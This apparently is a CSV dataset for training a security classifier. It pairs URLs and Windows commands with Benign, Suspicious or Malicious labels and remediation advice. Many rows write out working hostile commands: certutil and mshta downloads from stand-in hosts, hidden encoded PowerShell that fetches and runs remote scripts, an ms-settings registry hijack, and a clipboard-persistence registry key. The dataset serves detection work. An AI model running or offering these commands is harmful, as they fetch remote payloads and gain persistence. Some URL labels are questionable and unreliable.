input_text,target_text
analyze: lionelhampton.nl/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager51.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: dir C:\Users\Public\Documents,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: manta.com/c/mm5r49l/iknowmed,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager36.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: http://sventedorsthorst.nl/index.php/agenda/42-agenda-2012/\\\http:/sventedorsthorst.nl/components/com_jradio/radiostations/decibel.gif\\\,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager65.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager73.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: gowerinspirations.com/page2.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.seckmauern.de/index.php?option=com_content&view=category&layout=blog&id=1&Itemid=50&limitstart=5,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: dir C:\Users\Public\Documents,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager7.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process 'mshta.exe' 'http://stager38.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: echo 'System updated successfully' >> update_log_6.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: Start-Process notepad.exe,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXI3Ni5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process notepad.exe,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager48.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process 'mshta.exe' 'http://stager0.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: http://comies.nl/index.php/15-mei-gratis-proefles-nlp/day/20130208,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager59.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: http://www.hotelillaghetto.it/it/contattaci.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXIxMS5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXIzOS5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: antidotechoco.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: Start-Process 'mshta.exe' 'http://stager32.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXI0Ni5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Get-Date >> log_30.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: en.wikipedia.org/wiki/Dan_Fornade,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: Start-Process 'mshta.exe' 'http://stager28.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Get-Date >> log_38.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: http://www.ricardoitalo.com.br/portal/index.php?option=com_bibliadigital&view=all&Itemid=95,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.gallacher-sons.co.uk/index.php?view=detail&id=102&option=com_joomgallery&Itemid=57,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager5.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager55.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: http://mov-designtec.de/index.php?option=com_user&view=remind,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: hbperfumes.cf,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager33.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager16.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: http://torcache.net/torrent/59BC11FC8E41CF8FD6286D02D9B04B59A6E29346.torrent?title=[kickass.to]unbroken.2014.720p.brrip.x264.yify,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager79.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: columbustechfoundation.org/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager10.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: dir C:\Users\Public\Documents,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: americantowns.com/ca/alameda,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager3.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: answers.yahoo.com/question/index?qid=20081231071237AAcrKWw,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: Get-Date >> log_39.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXI2Ni5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager23.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXIyMS5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: dir C:\Users\Public\Documents,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager40.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: echo 'System updated successfully' >> update_log_11.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: Start-Process 'mshta.exe' 'http://stager1.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9zdGFnZXIyNi5jZG4tc3RhZ2UubmV0L3N0YWdlLnBzMScp,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: dir C:\Users\Public\Documents,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager75.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Get-Date >> log_19.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager15.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process notepad.exe,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager31.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process notepad.exe,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: http://down10b.zol.com.cn/zoldownload/wsextat81_98009.exe,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager64.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: bhri.eu/news.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager24.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process 'mshta.exe' 'http://stager13.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: mikedesimone.com/m08/pspix.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: Start-Process 'mshta.exe' 'http://stager60.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Start-Process notepad.exe,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager37.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: agebb.missouri.edu/weather/river.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager57.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: http://www.diarco.com.pe/portal/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5kaWFyY28uY29tLnBlL3BvcnRhbC9pbmRleC5waHA%2Fb3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD0xOmJpZW52ZW5pZG9z,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: Start-Process 'mshta.exe' 'http://stager47.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: Get-Date >> log_25.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: spoke.com/info/pF9IBVc/ErnieFazio,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: Start-Process 'mshta.exe' 'http://stager20.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: kelownakiosk.com/kelowna-events/Canada-Cowboy-Festival.php,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: Start-Process 'mshta.exe' 'http://stager70.cdn-stage.net/payload.hta',"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: echo 'System updated successfully' >> update_log_31.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager17.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: echo 'System updated successfully' >> update_log_3.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: bigbatman.bid,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
"analyze: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d ""cmd.exe /c start http://stager49.cdn-stage.net/cmd.bat"" /f","Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: http://rus-master.com/à¸°à¸à¸°à¸žà¸°à¸’à¸°à¸ž\321%81\321%82à¸°à¸˜.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager9.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager62.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: powershell -nop -EncodedCommand R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHBzbGlzdC50eHQ=,"Suspicious - Encodes a legitimate PowerShell script, which could be used for evasion or defense testing. Recommendation: Allow only signed encoded scripts, and inspect execution context."
analyze: for /f %i in ('whoami') do certutil -urlcache -split -f http://stager77.cdn-stage.net/%i.exe malware.exe,"Malicious - Obfuscated or staged execution method using trusted Windows tools (LOLBAS, MSHTA, COM hijack). Recommendation: Analyze encoded content, monitor use of trusted binaries (e.g., mshta, certutil), and restrict via AppLocker or SRP."
analyze: echo 'System updated successfully' >> update_log_32.txt,Benign - Standard Windows command or user-initiated utility launch — benign usage pattern. Recommendation: No action required.
analyze: http://www.ferienwohnungen-winterhoff.de/index.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: hopkinsmedicine.org/psychiatry/specialty_areas/moods/expert_team/payne.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: mkdir Reports\Q25,"Benign - Benign command related to documentation, backup logging, or help utilities. Recommendation: No action needed."
"analyze: reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal74.stealthdrop.net/clip.ps1')"" /f","Malicious - Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging. Recommendation: Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
analyze: http://www.jsjgw.com/news_View.aspx?mpid=1402&wzbz=xw1402,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
